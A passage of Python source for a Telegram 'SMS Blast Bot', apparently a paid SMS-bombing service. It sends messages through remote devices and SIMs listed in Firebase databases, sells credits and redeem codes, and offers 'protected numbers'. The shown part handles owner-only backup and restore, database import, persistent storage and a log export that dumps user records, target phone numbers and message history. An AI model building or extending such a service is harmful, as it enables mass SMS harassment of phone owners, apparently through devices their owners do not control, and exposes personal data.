            "⚠️ <i>Public DB hai — URL wala data dekh sakta hai, sirf apna trusted URL use karo.</i>",
            reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
            parse_mode="HTML"
        )
        return
    await state.clear()
    host = url.split("//", 1)[-1]
    last = now_ist().strftime("%Y-%m-%d %H:%M:%S (IST)") if _LAST_FB_BACKUP_TS[0] else "is session mein abhi nahi"
    await cq.message.edit_text(
        f"📦 <b>Backup Firebase</b>\n\n<code>{host}</code>\n\n"
        f"⏱ Last push: {last}\n🕐 Schedule: <b>hourly + har 15 min save pe</b>\n"
        f"♻️ Restart pe: DB missing/corrupt → isi se <b>auto-import</b>\n\n"
        "⚠️ <i>Public DB — sirf apna trusted URL use karo</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Backup Now", callback_data="obfb:do"),
             InlineKeyboardButton(text="♻️ Restore", callback_data="obfb:restore")],
            [InlineKeyboardButton(text="✏️ Change URL", callback_data="obfb:change"),
             InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="fed:home")]
        ]),
        parse_mode="HTML"
    )


# ── ♻️ FIREBASE RESTORE PICKER — latest + snapshots list, pick karke import ──
def _fb_node_label(node: str, meta: dict) -> str:
    """List button ke liye short label."""
    try:
        ts = datetime.fromtimestamp(int(meta.get("ts", 0)), _IST).strftime("%d-%m %H:%M")
    except Exception:
        ts = "?"
    users = meta.get("users", 0)
    fbs = meta.get("firebases", 0)
    if node == "latest":
        return f"♻️ LATEST ({ts} IST, {users}u/{fbs}db)"
    return f"♻️ {ts} IST ({users}u/{fbs}db)"


@R.callback_query(F.data == "obfb:restore")
async def obfb_restore_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫", show_alert=True)
        return
    await safe_answer(cq, "⏳ Firebase se backup list laayi ja rahi...")
    url = get_backup_fb_url(d)
    if not url:
        try:
            await cq.message.edit_text("❌ Pehle Backup Firebase URL set karo (Change URL).",
                                        reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        except TelegramBadRequest:
            pass
        return
    entries = []  # (node, meta)
    st, meta = await fb_http(url, "bot_backup/latest/meta", timeout=30)
    if st == 200 and isinstance(meta, dict) and isinstance(meta.get("parts"), int):
        entries.append(("latest", meta))
    st2, snaps = await fb_http(url, "bot_backup/snap", query="shallow=true", timeout=30)
    if st2 == 200 and isinstance(snaps, dict):
        for k in sorted(snaps.keys(), reverse=True):
            st3, m3 = await fb_http(url, f"bot_backup/snap/{k}/meta", timeout=30)
            if st3 == 200 and isinstance(m3, dict) and isinstance(m3.get("parts"), int):
                entries.append((f"snap/{k}", m3))
            if len(entries) >= 7:
                break
    if not entries:
        try:
            await cq.message.edit_text(
                "❌ Firebase mein koi valid backup nahi mila.\n\n"
                "<i>Pehle '🔄 Backup Now' se ek backup push karo.</i>",
                reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        except TelegramBadRequest:
            pass
        return
    lines = ["♻️ <b>Restore from Firebase</b>\n\n"]
    rows = []
    for i, (node, meta) in enumerate(entries):
        lines.append(f"{i + 1}. <b>{_fb_node_label(node, meta)}</b> — {_human_size(meta.get('size_raw', 0))} DB")
        rows.append([InlineKeyboardButton(text=_fb_node_label(node, meta)[:60],
                                          callback_data=f"obfb:restore:do:{node}")])
    rows.append([InlineKeyboardButton(text="⬅️ Wapas", callback_data="owner:backup_fb")])
    lines.append("\n⚠️ <i>Choose karo — current DB ka local backup ban jayega, phir chosen data main DB ban jayega.</i>")
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest as e:
        log.warning(f"[RESTORE-LIST] edit fail: {e}")


@R.callback_query(F.data.startswith("obfb:restore:do:"))
async def obfb_restore_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫", show_alert=True)
        return
    node = cq.data.split("obfb:restore:do:", 1)[1]
    if not (node == "latest" or (node.startswith("snap/") and len(node.split("/", 1)[1]) == 15)):
        await safe_answer(cq, "❌ Invalid backup node.", show_alert=True)
        return
    await safe_answer(cq)
    label = "LATEST" if node == "latest" else f"SNAP {node.split('/', 1)[1]}"
    try:
        await cq.message.edit_text(
            f"⚠️ <b>Confirm Restore</b>\n\n"
            f"Source: <b>{label}</b>\n\n"
            "1️⃣ Current main DB ka pehle local backup banega (safe)\n"
            "2️⃣ Chosen backup main DB ki jagah aayega\n"
            "3️⃣ Firebase latest usi data se re-sync hoga\n\n"
            "<i>Bot iske baad turant naye data par chalta hai — restart nahi chahiye.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Haan, restore karo", callback_data=f"obfb:restore:go:{node}")],
                [InlineKeyboardButton(text="❌ Wapas", callback_data="obfb:restore")]
            ]),
            parse_mode="HTML"
        )
    except TelegramBadRequest as e:
        log.warning(f"[RESTORE-CONFIRM] edit fail: {e}")


@R.callback_query(F.data.startswith("obfb:restore:go:"))
async def obfb_restore_go(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫", show_alert=True)
        return
    node = cq.data.split("obfb:restore:go:", 1)[1]
    if not (node == "latest" or (node.startswith("snap/") and len(node.split("/", 1)[1]) == 15)):
        await safe_answer(cq, "❌ Invalid backup node.", show_alert=True)
        return
    await safe_answer(cq, "⏳ Firebase se data aa raha hai...")
    url = get_backup_fb_url(d)
    if not url:
        try:
            await cq.message.edit_text("❌ Firebase URL set nahi hai!", parse_mode="HTML")
        except TelegramBadRequest:
            pass
        return
    try:
        # Safety: current DB ki local copy (Firebase mode mein file nahi — snap/ rotating
        # snapshots hi pre-restore safety net hain; picker se koi bhi snap wapas aa sakta hai)
        try:
            make_local_backup(d)
        except Exception:
            pass
        ok, data = await _fb_read_node(url, f"bot_backup/{node}")
        if not ok:
            try:
                await cq.message.edit_text(f"❌ <b>Restore fail:</b> Firebase se data padh nahi paya ({node}).",
                                            reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
            except TelegramBadRequest:
                pass
            return
        _fb_write_restore(data)
        n_users = len(data.get("users", {}) or {})
        n_fbs = len(data.get("firebases", []) or [])
        try:
            log_activity(load(), "fb_restore_manual", cq.from_user.id, f"node={node}, users={n_users}, dbs={n_fbs}")
        except Exception:
            pass
        # Firebase latest ko current (restored) state se re-sync karo
        try:
            _LAST_FB_BACKUP_TS[0] = time.time()
            asyncio.get_running_loop().create_task(fb_cloud_backup(load()))
        except Exception:
            pass
        try:
            await cq.message.edit_text(
                f"✅ <b>Restore complete!</b>\n\n"
                f"Source: <b>{'LATEST' if node == 'latest' else 'SNAP ' + node.split('/', 1)[1]}</b>\n"
                f"👥 Users: <b>{n_users}</b> | 🔥 Firebase DBs: <b>{n_fbs}</b>\n\n"
                "<i>Bot ab isi data par chal raha hai. Firebase latest bhi re-sync ho raha hai.</i>",
                reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"
            )
        except TelegramBadRequest as e:
            log.warning(f"[RESTORE-GO] edit fail: {e}")
    except Exception as e:
        log.error(f"[RESTORE-GO] error: {e}")
        try:
            await cq.message.edit_text(f"❌ Restore error: {str(e)[:200]}",
                                        reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        except TelegramBadRequest:
            pass


@R.callback_query(F.data == "obfb:change")
async def obfb_change(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq)
    await state.set_state(S.set_backup_fb)
    await cq.message.edit_text(
        "✏️ <b>Naya Backup Firebase URL</b> bhejo:\n<code>https://xxx-default-rtdb.firebaseio.com</code>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.set_backup_fb, F.text)
async def set_backup_fb_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    url = (msg.text or "").strip().rstrip("/")
    if not _fb_base_ok(url):
        await msg.answer("❌ Sirf Firebase DB URL allowed (https + firebaseio.com / firebasedatabase.app). Dobara bhejo:")
        return
    d["backup_fb_url"] = url
    save(d)
    ok, info = await fb_cloud_backup(load())
    line = f"✅ <b>Pehla backup complete!</b> ({info})" if ok else f"⚠️ URL save ho gaya lekin pehla backup fail: {info}"
    await state.clear()
    await msg.answer(
        f"📦 <b>Backup Firebase set:</b> <code>{url.split('//', 1)[-1]}</code>\n\n{line}\n\n"
        "Ab har 15 min save pe + hourly data isme push hota hai, aur restart pe isi se auto-import hoga.",
        parse_mode="HTML"
    )


@R.callback_query(F.data == "obfb:do")
async def obfb_do_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq, "⏳ Backup ho raha...")
    ok, info = await fb_cloud_backup(d)
    line = f"✅ <b>Backup complete!</b> {info}" if ok else f"❌ <b>Backup fail:</b> {info}"
    host = get_backup_fb_url(d).split("//", 1)[-1]
    try:
        await cq.message.edit_text(f"{line}\n\n<code>{host}</code>", parse_mode="HTML")
    except TelegramBadRequest:
        await cq.message.answer(line, parse_mode="HTML")


@R.callback_query(F.data == "owner:import_db")
async def owner_import_db_start(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    if not is_owner(uid, load()):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.import_db)
    await cq.message.edit_text(
        "📥 <b>Database Import</b>\n\n"
        "Apni backup wali <code>.json</code> ya <code>.gz</code> file bhejo (max 40MB).\n"
        "<i>Channel ka latest backup .gz hota hai — wahi bhejna best hai.</i>\n\n"
        "📦 Pehle aapka current DB auto-backup hoga (file mil jayegi)\n"
        "⚠️ Import ke baad bot turant naye data par chalta hai\n\n"
        "<i>Cancel: " + f"{sc('cancel')}" + " button ya /cancel text</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.import_db, F.document)
async def owner_import_db_done(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if not is_owner(uid, load()):
        await state.clear()
        return
    fname = (msg.document.file_name or "").lower()
    is_gz = fname.endswith(".gz")
    if not (is_gz or fname.endswith(".json")):
        await msg.answer("❌ Sirf <code>.json</code> ya <code>.gz</code> (backup) file bhejo!", parse_mode="HTML")
        return
    # .gz chhota hota hai (40MB DB ~ 4MB) — isliye .gz ke liye 40MB limit;
    # raw .json ke liye 20MB (Bot API download limit isse badi file allow nahi karta)
    limit = 40 * 1024 * 1024 if is_gz else 20 * 1024 * 1024
    if msg.document.file_size and msg.document.file_size > limit:
        extra = "" if is_gz else " — .gz wala file chhota hota hai, channel se .gz download karke bhejo"
        await msg.answer(f"❌ File {limit//1024//1024}MB se badi nahi ho sakti{extra}!", parse_mode="HTML")
        return

    buf = io.BytesIO()
    await msg.bot.download(msg.document, destination=buf)
    raw = buf.getvalue()
    if raw[:2] == b"\x1f\x8b":  # gzip magic — extension chahe .json ho ya .gz
        try:
            raw = gzip.decompress(raw)
        except Exception as e:
            await state.clear()
            await msg.answer(f"❌ GZIP decompress fail: {e}", parse_mode="HTML")
            return
    try:
        data = json.loads(raw.decode("utf-8"))
    except Exception as e:
        await state.clear()
        await msg.answer(f"❌ Invalid JSON: {e}", parse_mode="HTML")
        return

    if not isinstance(data, dict) or "users" not in data:
        await state.clear()
        await msg.answer("❌ Ye blast bot ka backup file nahi lagta! ('users' key missing)", parse_mode="HTML")
        return

    # missing keys ko default se fill karo
    for k, v in _default_data().items():
        data.setdefault(k, v)
    if MAIN_OWNER not in data.get("owners", []):
        data["owners"].insert(0, MAIN_OWNER)

    # current DB ka backup rakho
    backup_name = f"blast_data_preimport_{now_ist().strftime('%Y%m%d_%H%M%S')}.json"
    have_backup = os.path.exists(_DATA_FILE)
    if have_backup:
        shutil.copy2(_DATA_FILE, backup_name)

    # atomic write
    tmp = _DATA_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    os.replace(tmp, _DATA_FILE)
    _data_cache_invalidate()

    global PROTECTED_NUMBERS
    _pn_raw = data.get("protected_numbers", {}) or {}
    PROTECTED_NUMBERS = {norm_number(k): v for k, v in _pn_raw.items() if norm_number(k)}
    log_activity(data, "db_import", uid, f"Imported {len(data.get('firebases', []))} DBs, {len(data.get('users', {}))} users")
    save(data)

    await state.clear()
    if have_backup:
        try:
            await msg.answer_document(
                document=FSInputFile(backup_name),
                caption="📦 Pehle aapka PURANA DB backup — safe jagah rakh lo!"
            )
        except Exception:
            pass
    await msg.answer(
        "✅ <b>Database Import Complete!</b>\n\n"
        f"👥 Users: <b>{len(data.get('users', {}))}</b>\n"
        f"🔥 Firebase DBs: <b>{len(data.get('firebases', []))}</b>\n"
        f"📊 Total Sent: <b>{data.get('stats', {}).get('total_sent', 0)}</b>\n"
        f"❌ Total Failed: <b>{data.get('stats', {}).get('total_failed', 0)}</b>\n\n"
        "<i>Bot ab isi data par chala raha hai — restart ki zaroorat nahi. Scanner ab 24 ghante mein 1 baar chalta hai (cached results turant dikhte hain).</i>",
        parse_mode="HTML"
    )


@R.message(S.import_db)
async def owner_import_db_wrong(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    if msg.text and "/cancel" in msg.text:
        await state.clear()
        await msg.answer("❌ Import cancel ho gaya.")
        return
    await msg.answer("❌ Sirf .json FILE bhejo (document). Text se nahi hoga!", parse_mode="HTML")


_FSM_TEXT_STATES = [
    S.send_number,
    S.send_message,
    S.send_count,
    S.owner_send_number,
    S.owner_send_message,
    S.owner_send_count,
    S.admin_send_number,
    S.admin_send_message,
    S.admin_send_count,
    S.protect_number,
    S.track_number,
    S.add_all_credits_amount,
    S.deduct_all_credits_amount,
    S.transfer_credits_uid,
    S.transfer_credits_amount,
    S.add_firebase,
    S.add_owner,
    S.add_admin,
    S.ban_user,
    S.fj_add_channel,
    S.fj_add_link,
    S.add_plan_name,
    S.add_plan_price,
    S.add_plan_credits,
    S.add_plan_link,
    S.gen_redeem_credits,
    S.gen_redeem_uses,
    S.add_credits_uid,
    S.add_credits_amount,
    S.deduct_credits_uid,
    S.deduct_credits_amount,
    S.set_ref_credits,
    S.redeem_code,
    S.fb_editor_url,
    S.fb_editor_menu,
    S.fb_ed_path,
    S.fb_ed_value,
    S.fb_del_path,
    S.set_backup_fb,
]


@R.message(F.state.in_(_FSM_TEXT_STATES))
async def fsm_wrong_content_type(msg: Message, state: FSMContext):
    # Text ke liye wala handler pehle match ho chuka hai;
    # yahan sticker/photo/video/voice waghera girega
    await msg.answer("⚠️ <b>Yahan sirf TEXT bhejo!</b>\n\n<i>Sticker/photo/video kaam nahi karega — jo step chal raha hai uska TEXT bhejo.</i>", parse_mode="HTML")


@R.message(Command("logs"))
async def cmd_logs(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    if not is_owner(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Owner only!", parse_mode="HTML")
        return

    # Collect all logs
    log_lines = []
    log_lines.append("=" * 60)
    log_lines.append("  SMS BLAST BOT - FULL DATABASE LOG EXPORT")
    log_lines.append(f"  Exported by: {uid} | Time: {now_ist().strftime('%Y-%m-%d %H:%M:%S')}")
    log_lines.append("=" * 60)
    log_lines.append("")

    # 1. Bot Info
    log_lines.append("[BOT INFO]")
    log_lines.append(f"Version: {_VERSION}")
    log_lines.append(f"Main Owner: {MAIN_OWNER}")
    log_lines.append(f"Super Admin: {SUPER_ADMIN_NAME}")
    log_lines.append(f"Log Channel: {LOG_CHANNEL_ID}")
    log_lines.append("")

    # 2. Owners & Admins
    log_lines.append("[OWNERS & ADMINS]")
    log_lines.append(f"Owners ({len(d.get('owners', []))}): {d.get('owners', [])}")
    log_lines.append(f"Admins ({len(d.get('admins', []))}): {d.get('admins', [])}")
    log_lines.append(f"Banned ({len(d.get('banned', []))}): {d.get('banned', [])}")
    log_lines.append("")

    # 3. Settings
    log_lines.append("[SETTINGS]")
    settings = d.get("settings", {})
    log_lines.append(f"Free Mode: {d.get('free_mode', False)}")
    log_lines.append(f"Ref Credits: {settings.get('ref_credits', 3)}")
    log_lines.append(f"Max Owners: {settings.get('max_owners', 6)}")
    log_lines.append("")

    # 4. Force Join Channels
    fj = d.get("force_join", {})
    log_lines.append(f"[FORCE JOIN] Enabled: {fj.get('enabled', False)}")
    for ch in fj.get("channels", []):
        log_lines.append(f"  - {ch.get('title', 'Channel')} | ID: {ch.get('id')} | Link: {ch.get('link')} | Required: {ch.get('required', True)}")
    log_lines.append("")

    # 5. Firebase DBs
    fbs = d.get("firebases", [])
    log_lines.append(f"[FIREBASE DATABASES] Total: {len(fbs)}")
    for fb in fbs:
        fb_count = FB_DEVICE_COUNTS.get(fb['id'], {})
        log_lines.append(f"  - ID: {fb['id']}")
        log_lines.append(f"    Label: {fb.get('label', 'N/A')}")
        log_lines.append(f"    URL: {fb['url']}")
        log_lines.append(f"    Added: {fmt_time(fb.get('added_at', 0))}")
        log_lines.append(f"    Online Devices: {fb_count.get('online', 0)}")
    log_lines.append("")

    # 6. Users
    users = d.get("users", {})
    log_lines.append(f"[USERS] Total: {len(users)}")
    for uid_str, udata in users.items():
        log_lines.append(f"  User ID: {uid_str}")
        log_lines.append(f"    Name: {udata.get('name', 'Unknown')}")
        log_lines.append(f"    Credits: {udata.get('credits', 0)}")
        log_lines.append(f"    Manual Added: {udata.get('manual_added_credits', 0)}")
        log_lines.append(f"    Uses: {udata.get('uses', 0)}")
        log_lines.append(f"    Joined: {fmt_time(udata.get('joined_at', 0))}")
        log_lines.append(f"    Refer Code: {udata.get('refer_code', 'None')}")
        log_lines.append(f"    Referred By: {udata.get('referred_by', 'None')}")
    log_lines.append("")

    # 7. Stats
    stats = d.get("stats", {})
    log_lines.append("[STATS]")
    log_lines.append(f"Total Sent: {stats.get('total_sent', 0)}")
    log_lines.append(f"Total Failed: {stats.get('total_failed', 0)}")
    api_usage = stats.get("api_usage", {})
    if api_usage:
        log_lines.append("Per Firebase Usage:")
        for fb_id, fb_stats in api_usage.items():
            log_lines.append(f"  - {fb_id}: Sent={fb_stats.get('sent', 0)}, Failed={fb_stats.get('failed', 0)}")
    log_lines.append("")

    # 8. Protected Numbers
    protected = d.get("protected_numbers", {})
    log_lines.append(f"[PROTECTED NUMBERS] Total: {len(protected)}")
    for num, protector in protected.items():
        log_lines.append(f"  - {num} | Protected By: {protector}")
    log_lines.append("")

    # 9. Pricing Plans
    plans = d.get("pricing", {}).get("plans", [])
    log_lines.append(f"[PRICING PLANS] Total: {len(plans)}")
    for plan in plans:
        log_lines.append(f"  - {plan.get('name', 'Plan')}: {plan.get('price', 0)} {plan.get('currency', 'INR')} = {plan.get('credits', 0)} credits")
    log_lines.append("")

    # 10. Redeem Codes
    codes = d.get("redeem_codes", {})
    log_lines.append(f"[REDEEM CODES] Total: {len(codes)}")
    for code, cdata in codes.items():
        log_lines.append(f"  - {code}: {cdata.get('credits', 0)} credits | Uses Left: {cdata.get('uses_left', 0)} | Used By: {len(cdata.get('used_by', []))}")
    log_lines.append("")

    # 11. Videos
    videos = d.get("videos", [])
    log_lines.append(f"[VIDEOS] Total: {len(videos)}")
    for i, vid in enumerate(videos, 1):
        log_lines.append(f"  #{i}: {vid[:50]}...")
    log_lines.append("")

    # 12. Activity Log
    activity = d.get("activity_log", [])
    log_lines.append(f"[ACTIVITY LOG] Total: {len(activity)} (Last 50)")
    for entry in activity[-50:]:
        ts = fmt_time(entry.get("timestamp", 0))
        log_lines.append(f"  [{ts}] UID:{entry.get('uid', 0)} | Action:{entry.get('action', 'unknown')} | {entry.get('details', '')}")
    log_lines.append("")

    # 13. SMS History (last 20 per user)
    sms_hist = d.get("sms_history", {})
    log_lines.append(f"[SMS HISTORY] Users with history: {len(sms_hist)}")
    for uid_str, hist_list in list(sms_hist.items())[:20]:
        log_lines.append(f"  User {uid_str}: {len(hist_list)} entries")
        for entry in hist_list[-3:]:
            ts = fmt_time(entry.get("timestamp", 0))
            log_lines.append(f"    [{ts}] {entry.get('status', '?')} | {entry.get('number', 'N/A')} | {entry.get('message', '')[:30]}...")
    log_lines.append("")

    # 14. Device Health Log
    log_lines.append(f"[DEVICE HEALTH LOG] Total: {len(DEVICE_HEALTH_LOG)} (Last 20)")
    for entry in DEVICE_HEALTH_LOG[-20:]:
        ts = fmt_time(entry.get("timestamp", 0))
        log_lines.append(f"  [{ts}] Devices: {entry.get('devices_found', 0)} | DBs: {entry.get('dbs_scanned', 0)} | Duration: {entry.get('duration_sec', 0)}s | Status: {entry.get('status', 'unknown')}")
    log_lines.append("")

    # 15. Cached Devices
    log_lines.append(f"[CACHED DEVICES] Total: {len(CACHED_DEVICES)} (Current)")
    for dev in CACHED_DEVICES[:10]:
        log_lines.append(f"  - {dev.get('dev_name', 'Unknown')} | FB: {dev.get('fb_label', 'N/A')} | SIMs: {len(dev.get('sims', []))}")
    if len(CACHED_DEVICES) > 10:
        log_lines.append(f"  ... and {len(CACHED_DEVICES) - 10} more devices")
    log_lines.append("")

    log_lines.append("=" * 60)
    log_lines.append("  END OF LOG EXPORT")
    log_lines.append("=" * 60)

    log_text = "\n".join(log_lines)

    # Send as document
    from aiogram.types import BufferedInputFile
    file_bytes = io.BytesIO(log_text.encode("utf-8"))
    file_bytes.name = f"blast_bot_logs_{now_ist().strftime('%Y%m%d_%H%M%S')}.txt"

    await msg.answer_document(
        document=BufferedInputFile(file_bytes.getvalue(), filename=file_bytes.name),
        caption=f"{em(EMOJI_GEAR, '📜')} <b>Full Database Log Export</b>\n{em(EMOJI_STAR, '📊')} Version: {_VERSION}\n{em(EMOJI_GEAR, '📅')} Generated: {now_ist().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode="HTML"
    )


_PERSIST_CANDIDATES = ["/var/data", "/data", "/mnt/data", "/var/lib/blastbot"]


def _find_persist_dir() -> "str | None":
    """Persistent storage auto-detect — Render Persistent Disk ka default mount /var/data hai.
    Agar aisi dir mounted + writable hai toh data/backup wahan rakhenge (redeploy pe safe)."""
    for p in _PERSIST_CANDIDATES:
        try:
            if os.path.isdir(p) and os.access(p, os.W_OK):
                return p
        except Exception:
            pass
    return None


def _ensure_persistent_storage() -> "str | None":
    """Agar persistent dir mile toh main DB + purane backups wahan shift/sync karo,
    aur aage saara data (har save + backup) persistent path par hi chalta hai.
    Ek baar setup hone ke baad har restart/redeploy pe data safe."""
    global _DATA_FILE, _BACKUP_DIR
    pd = _find_persist_dir()
    if not pd:
        return None
    try:
        persist_db = os.path.join(pd, "blast_data.json")
        cur_has = os.path.exists(_DATA_FILE) and _db_has_data(_DATA_FILE)
        per_has = os.path.exists(persist_db) and _db_has_data(persist_db)
        if per_has and not cur_has:
            # persist mein data hai, current missing/empty (wipe hua tha) → persist se uthao
            shutil.copy2(persist_db, _DATA_FILE)
            log.info(f"[PERSIST] DB {pd} se current location par restore hua")
        elif cur_has and not per_has:
            shutil.copy2(_DATA_FILE, persist_db)
            log.info(f"[PERSIST] DB {pd} par migrate hua")
        elif cur_has and per_has:
            # dono real — CWD wala latest hai (persist mirror refresh karo)
            shutil.copy2(_DATA_FILE, persist_db)
        # purane local backups bhi persist dir mein le aao
        for old_bk in glob.glob("blast_data_backup_*.json"):
            dst = os.path.join(pd, os.path.basename(old_bk))
            if not os.path.exists(dst):
                shutil.copy2(old_bk, dst)
        # ab main DB + backups persistent path par hi
        if os.path.exists(_DATA_FILE):
            shutil.copy2(_DATA_FILE, persist_db)
        _DATA_FILE = persist_db
        _BACKUP_DIR = pd
        log.info(f"[PERSIST] Persistent storage active: {pd} — ab restart/redeploy par data safe")
        return pd
    except Exception as e:
        log.warning(f"[PERSIST] setup failed: {e}")
        return None


def _db_has_data(path: str, pre: dict = None) -> bool:
    """DB file mein real data hai? (users ya firebases) — sirf empty default file nahi.
    2KB+ file → directly True (empty default file ~500B hota hai; 22MB DB ko parse karke
    check karna startup OOM/crash ka cause banta tha)."""
    if pre is not None:
        d = pre
    else:
        try:
            if os.path.getsize(path) > 2048:
                return True
        except OSError:
            return False
        try:
            with open(path, "r", encoding="utf-8") as f:
                d = json.load(f)
        except Exception:
            return False
    return len(d.get("users", {}) or {}) > 0 or len(d.get("firebases", []) or []) > 0


def _find_latest_backup() -> "str | None":
    """Latest local backup dhundo — CWD aur script folder DONO jagah
    (Render pe jab CWD script se alag ho tab bhi mil jaaye)"""
    candidates = set()
    for dd in {_BACKUP_DIR, ".", os.path.dirname(os.path.abspath(__file__))}:
        try:
            candidates.update(glob.glob(os.path.join(dd, "blast_data_backup_*.json")))
        except Exception:
            pass
    candidates = sorted({os.path.abspath(p) for p in candidates})
    return candidates[-1] if candidates else None


async def auto_restore_db_if_needed(bot=None) -> str:
    """System/bot restart par recent backup se DIRECT auto-import.
    Rules:
      1) Main DB missing ya corrupt                → latest backup se direct import
      2) Main DB valid lekin EMPTY (koi users/firebases nahi) → latest backup se direct import
      3) Main DB valid + data hai                  → main DB hi recent se recent hai
         (backup 1 ghanta purana ho sakta hai, usse cover na karein) → main rakho
    Return: "ok" | "restored:<file>" | "no_backup" | "restore_failed" """
    latest = _find_latest_backup()
    log.info(f"[RESTORE] startup check — latest backup: {latest or 'NAHI mila'}")

    main_valid = False
    if os.path.exists(_DATA_FILE):
        try:
            # EK hi parse — result seedha _DATA_CACHE mein warm karo (OOM-guard:
            # 22MB+ DB ke multiple startup parses VPS pe OOM-kill kar rahe the).
            # merged=False: defaults-merge pehli load() pe hoga (parse wapas nahi hota).
            st = os.stat(_DATA_FILE)
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                _main_data = json.load(f)
            main_valid = isinstance(_main_data, dict)
            if main_valid:
                _DATA_CACHE["data"] = _main_data
                _DATA_CACHE["mtime"] = st.st_mtime
                _DATA_CACHE["size"] = st.st_size
                _DATA_CACHE["merged"] = False
        except Exception as e:
            log.error(f"[RESTORE] main DB corrupt: {e}")
    else:
        log.error("[RESTORE] main DB file missing")

    if main_valid and _db_has_data(_DATA_FILE, pre=_main_data if main_valid else None):
        log.info("[RESTORE] main DB valid + data present — yahi latest data hai, import skip")
        return "ok"

    # Import zaroori hai (DB missing/corrupt/empty) — pehle local, phir FIREBASE se direct import
    if not latest:
        try:
            ok_f, info_f = await fb_cloud_restore()
            if ok_f:
                log.info(f"[RESTORE] FIREBASE SE DIRECT IMPORT HO GAYA: {info_f}")
                return f"restored:{info_f}"
            if info_f != "not_configured":
                log.warning(f"[RESTORE] firebase restore fail: {info_f}")
        except Exception as e:
            log.error(f"[RESTORE] firebase restore error: {e}")
        # Channel backup (saved file_id manifest se)
        if bot is not None:
            try:
                ok_c, info_c = await _restore_from_channel(bot)
                if ok_c:
                    log.info(f"[RESTORE] CHANNEL SE DIRECT IMPORT HO GAYA: {info_c}")
                    return f"restored:{info_c}"
                if info_c != "no_channel_ref":
                    log.warning(f"[RESTORE] channel restore fail: {info_c}")
            except Exception as e:
                log.error(f"[RESTORE] channel restore error: {e}")
        if main_valid:
            log.info("[RESTORE] main DB empty hai lekin koi backup (local/firebase) nahi — fresh start")
        else:
            log.warning("[RESTORE] main DB missing/corrupt + koi backup nahi — fresh start")
        return "no_backup"

    try:
        with open(latest, "r", encoding="utf-8") as f:
            json.load(f)  # backup pehle validate karo
        shutil.copy2(latest, _DATA_FILE)
        _data_cache_invalidate()
        log.info(f"[RESTORE] RECENT BACKUP SE DIRECT IMPORT HO GAYA: {latest}")
        return f"restored:{os.path.basename(latest)}"
    except Exception as e:
        log.error(f"[RESTORE] restore failed: {e}")
        return "restore_failed"




# ── 🎁 DAILY REWARD (auto) — admin on/off + amount set karta hai ──────────
# Har private user ka 24h ke beech PEHLA message → automatic +amount credits
# + "Your credit increased" notification. New user ko /start hote hi milta hai.
DAILY_REWARD_HOURS = 24
# In-memory cache — har message pe DB file parse MAT karo (CPU safe).
# File load/save sirf tab hota hai jab reward ACTUALLY grant ho (24h mein 1 baar/user).
_DAILY_REWARD_CACHE = {"enabled": False, "amount": 0, "last_give": {}}

def _dr_cache_refresh(d: dict = None):
    """Cache ko DB se sync karo (startup / toggle / amount set / grant ke baad)."""
    global _DAILY_REWARD_CACHE
    if d is None:
        try:
            d = load()
        except Exception:
            d = {}
    dr = d.get("daily_reward") or {}
    try:
        _DAILY_REWARD_CACHE = {
            "enabled": bool(dr.get("enabled")),
            "amount": int(dr.get("amount") or 0),
            "last_give": {str(k): int(v) for k, v in (dr.get("last_give") or {}).items()},
        }
    except Exception:
        _DAILY_REWARD_CACHE = {"enabled": False, "amount": 0, "last_give": {}}


async def _daily_reward_check(msg: Message):
    """Ek message aane par: daily reward due? FAST PATH = in-memory (koi file IO nahi)."""
    if not _DAILY_REWARD_CACHE["enabled"] or _DAILY_REWARD_CACHE["amount"] <= 0:
        return
    uid = msg.from_user.id
    now = int(time.time())
    if now - int(_DAILY_REWARD_CACHE["last_give"].get(str(uid), 0)) < DAILY_REWARD_HOURS * 3600:
        return
    # Due hai — abhi file par confirm + grant (sirf yahan load/save)
    try:
        d = load()
        dr = d.get("daily_reward") or {"enabled": False, "amount": 10, "last_give": {}}
        if not dr.get("enabled"):
            _dr_cache_refresh(d)
            return
        amount = int(dr.get("amount") or 0)
        if amount <= 0:
            _dr_cache_refresh(d)
            return
        if is_banned(uid, d):
            return
